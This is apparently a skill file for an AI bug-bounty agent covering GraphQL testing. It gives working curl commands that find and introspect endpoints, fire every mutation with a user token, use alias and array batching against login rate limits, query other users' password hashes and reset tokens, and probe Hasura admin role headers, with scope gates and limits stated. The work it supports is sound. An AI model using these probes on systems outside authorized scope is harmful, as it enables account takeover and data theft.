---
name: zp-graphql
description: ZeroProtocol hunter for GraphQL-specific weaknesses. Use when a /graphql, /api/graphql, /v1/graphql or Apollo/Hasura/Relay endpoint is in scope, when testing introspection, when hunting field-level authorization gaps, batching or alias abuse, query depth and cost problems, or when a GraphQL mutation needs authorization testing. Recovers the schema first, then walks every query and mutation against the role matrix, because GraphQL hides an enormous surface behind one URL.
---

# zp-graphql - one endpoint, hundreds of operations

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

A REST app shows you its routes. A GraphQL app shows you one route and hides several hundred
operations behind it, each with its own authorization decision - and the resolver authors
frequently assumed the gateway handled it. **Recover the schema, then test every mutation.**

---

## Procedure

**1. Find the endpoint.**

```bash
for p in graphql api/graphql v1/graphql graphql/v1 query api/query gql \
         graphql/console graphiql playground altair v1/relay index.php?graphql; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' -X POST "https://$H/$p" \
         -H 'Content-Type: application/json' -d '{"query":"{__typename}"}')
  [ "$code" != "404" ] && echo "$code /$p"
done
```

A `data.__typename` in the reply is the confirmation - read the type name, do not match a fixed
string: most servers answer `Query`, Hasura answers `query_root`. A `400` complaining about a
missing query also confirms a GraphQL handler.

**2. Introspect. If it is on, you have the entire surface for free.**

```bash
Q='{"query":"query{__schema{types{name kind fields{name args{name type{name ofType{name}}} type{name kind ofType{name}}}}}}"}'
curl -sk -X POST "https://$H/graphql" -H 'Content-Type: application/json' -d "$Q" -o schema.json
jq -r '.data.__schema.types[] | select(.name=="Query" or .name=="Mutation") | .fields[].name' schema.json
jq -r '.data.__schema.types[] | select(.fields) | .name as $t | .fields[] | "\($t).\(.name)"' schema.json | head -80
```

That query is deliberately short so it is easy to paste. It is **not** a full introspection
query: it omits `queryType`/`mutationType`/`subscriptionType`, `directives`, `enumValues`,
`interfaces`/`possibleTypes`, and it unwraps `ofType` only two levels, so it misses enums,
unions, interfaces and deeply-wrapped types like `[[User!]!]!`. It also assumes the root types
are literally named `Query` and `Mutation`, which is conventional but not required. When you need
the complete schema, use the standard full introspection query (the one GraphiQL sends) or
`graphql-inspector`/`gql-cli`, and diff the operation list against what the bundle actually calls.

Introspection disabled? Three ways forward:

```bash
# a) field suggestions - the error message leaks the real names
curl -sk -X POST "https://$H/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{usr}"}' | jq -r '.errors[].message'     # 'Did you mean "user"?'
# b) the bundle usually contains every query the app sends
grep -ohE '(query|mutation)\s+[A-Za-z0-9_]+\s*(\([^)]*\))?\s*\{[^}]{0,400}' js/*.js | head -40
# c) clairvoyance-style brute force over suggestion responses (slow, but complete)
```

Field suggestions are the fastest of the three and are on by default in most servers even when
introspection is off.

**3. Enumerate mutations and test each against the role matrix.** This is the core of the skill -
mutations are the dangerous half and there are usually dozens.

```bash
jq -r '.data.__schema.types[] | select(.name=="Mutation") | .fields[].name' schema.json > gql-mutations.txt
while read -r m; do
  printf '%-40s ' "$m"
  curl -sk -X POST "https://$H/graphql" -H 'Content-Type: application/json' \
    -H "Authorization: Bearer $TOK_A" \
    -d "{\"query\":\"mutation{$m}\"}" \
    | jq -r 'if .errors then (.errors[0].message|.[0:70]) else "NO AUTH ERROR - INVESTIGATE" end'
done < gql-mutations.txt
```

Read the error text carefully. `Field "x" argument "id" of type "ID!" is required` means you
passed authorization and failed *validation* - the resolver is reachable. That is the signal.
`Not authorized` means the check exists.

**4. Field-level authorization.** The object is allowed; a field on it is not.

```graphql
query {
  me { id email }
  user(id: "<B_ID>") { id email phone passwordHash resetToken isAdmin internalNotes }
  users(first: 5) { edges { node { id email stripeCustomerId } } }
}
```

Authorization in GraphQL is frequently applied at the *query* level and forgotten at the *field*
resolver. `user(id:)` returning `email` for another user is `zp-idor` through a GraphQL door.

**5. Batching and aliasing - the two GraphQL-specific bypasses.**

```bash
# array batching: many operations, one HTTP request -> defeats per-request rate limiting
curl -sk -X POST "https://$H/graphql" -H 'Content-Type: application/json' \
  -d '[{"query":"mutation{login(user:\"a\",pass:\"p1\"){token}}"},
       {"query":"mutation{login(user:\"a\",pass:\"p2\"){token}}"},
       {"query":"mutation{login(user:\"a\",pass:\"p3\"){token}}"}]'

# alias batching: many calls, ONE operation -> defeats rate limits that count operations
curl -sk -X POST "https://$H/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"mutation{a:login(user:\"a\",pass:\"p1\"){token} b:login(user:\"a\",pass:\"p2\"){token}}"}'
```

Alias batching against an OTP or password field is a real authentication-bypass primitive.
**Use a small number of aliases (3-5) against your own account** to prove the mechanism. Do not
actually brute-force a credential - the finding is that rate limiting is bypassable, and three
aliases in one request demonstrates that completely.

**6. Depth, cost and introspection-as-DoS.** Test the *existence* of a limit, not its breaking
point.

```bash
# is there a depth limit at all? A modest nested query answers it.
curl -sk -X POST "https://$H/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{user(id:1){posts{author{posts{author{id}}}}}}"}' | jq -r '.errors[0].message // "no depth error"'
```

**Never send a deeply recursive or circular query to a live target.** That is a denial-of-service
test and it is excluded by every program. Report "no depth or cost limit is enforced" as a
configuration finding, evidenced by a modest nested query being accepted and by the schema
containing a cycle. Do not demonstrate the outage.

**7. The rest of the checklist.**

| Check | Test |
|---|---|
| `GET`-based queries | `GET /graphql?query={me{id}}` - enables CSRF and cache poisoning |
| CSRF on mutations | `Content-Type: application/x-www-form-urlencoded` with a query body |
| unauthenticated introspection | schema with no token at all |
| debug/dev consoles | `/graphiql`, `/playground`, `/altair`, `/voyager` reachable in production |
| error verbosity | `"extensions":{"exception":{"stacktrace":[...]}}` |
| `@skip`/`@include` abuse | directive-driven authz bypass on conditional fields |
| relay `node(id:)` | global-id decoding - base64 `Type:123`, swap the id -> `zp-idor` |
| injection through resolvers | resolver arguments reaching SQL/NoSQL -> `zp-sqli` |
| file upload via GraphQL | `multipart/form-data` spec -> `zp-upload` |
| Hasura | `x-hasura-role`, `x-hasura-user-id` headers accepted from the client |

Hasura deserves a specific note, and a caution. The engine honours a client-supplied
`x-hasura-role` only when the request is *already* trusted - it carries the admin secret, or the
role is listed in the JWT's `x-hasura-allowed-roles` or the auth webhook's answer - or when no
admin secret is configured at all, in which case every request is admin before you send a header.
A `200` on `{__typename}` therefore proves nothing: the unauthenticated role answers it too. Prove
the header changes what you can reach, with a differential:

```bash
Q='{"query":"{__schema{queryType{fields{name}}}}"}'
for hdr in 'X-ZP-Probe: baseline' 'x-hasura-role: admin'; do
  printf '%-28s ' "$hdr"
  curl -sk -X POST "https://$H/v1/graphql" -H 'Content-Type: application/json' \
    -H "$hdr" -d "$Q" \
    | jq -c '{err:.errors[0].message, fields:(.data.__schema.queryType.fields//[]|length)}'
done
```

Equal field counts mean the header was ignored - killed. `Your requested role is not in allowed
roles` is the same kill, stated out loud. A wider schema, or a table that only reads with the
header, is the finding - and its root cause is a leaked `x-hasura-admin-secret`, an over-broad
`x-hasura-allowed-roles` claim, or an engine deployed with no admin secret at all. Name that cause
in the report; "the header was accepted" on its own is a false Critical.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| mutation executes with a user token and takes effect | **confirmed BFLA.** High to Critical |
| sensitive field returned for another user | confirmed field-level authz gap |
| alias batching bypasses a rate limit | confirmed. Report the mechanism, 3-5 aliases as proof |
| `x-hasura-role: admin` widens the schema or reads what the anon role cannot | **Critical.** Admin over the database - state the cause (leaked secret, over-broad allowed roles, no secret set) |
| the same query answers identically with and without `x-hasura-role` | the header is ignored. Killed |
| introspection enabled | information disclosure, Low on its own - the value is what you do with it |
| suggestions leak field names | Low on its own; use it to find the real finding |
| no depth/cost limit | Medium configuration finding. Never demonstrate the outage |
| GraphiQL/playground exposed in production | Low to Medium; higher if it is authenticated-by-accident |
| validation error after passing auth | the resolver is reachable - **keep going**, do not call it authorized |
| `Not authorized` on every mutation | correctly implemented. Killed |
| stack traces in `extensions` | information disclosure |

**The most common misread:** treating a validation error as an authorization block. `argument
"id" is required` means you got past the guard.

---

## High-value patterns

- **A mutation with no authorization check** - `deleteUser`, `updateRole`, `createApiKey`, `impersonate`. Enumerate every one.
- **`user(id:)` exposing email or phone** - GraphQL IDOR, extremely common.
- **Alias batching against OTP or login** - authentication rate-limit bypass.
- **Hasura role headers trusted from the client.**
- **Relay global ids** that are just base64 `Type:id`.
- **An admin-only field on a shared type** - the same `User` type serves both the admin and the public query.
- **Introspection on a staging GraphQL** that mirrors production's schema.
- **Nested resolvers reaching a different service** without re-authorizing -> `zp-ssrf`, `zp-authz`.

---

## Pitfalls

- **Recursive/circular queries against production.** DoS. Never.
- **Actually brute-forcing credentials via batching.** Prove the bypass with 3-5 aliases on your own account.
- **Reporting introspection alone** as a significant finding. It is a door, not a room.
- **Mistaking validation errors for authorization.**
- **Testing only queries.** Mutations are where the severity is.
- **Missing field suggestions** and concluding the schema is unrecoverable.
- **Executing destructive mutations** (`deleteX`) on anything you did not create.
- **Ignoring `GET`-based queries** and the CSRF/caching consequences.
- **Forgetting the bundle** already contains the operations the app uses.

---

## Hand off to

Object/field ids -> `zp-idor`. Mutation authz -> `zp-authz`. Tokens -> `zp-jwt-oauth`.
Resolver injection -> `zp-sqli`, `zp-rce-ssti`. URL arguments -> `zp-ssrf`.
GraphQL uploads -> `zp-upload`. `GET` queries and caching -> `zp-cache-poison`, `zp-cors`.
Schema recovered from the bundle -> `zp-js-secrets`. Confirmed -> `zp-triage`, `zp-report`.
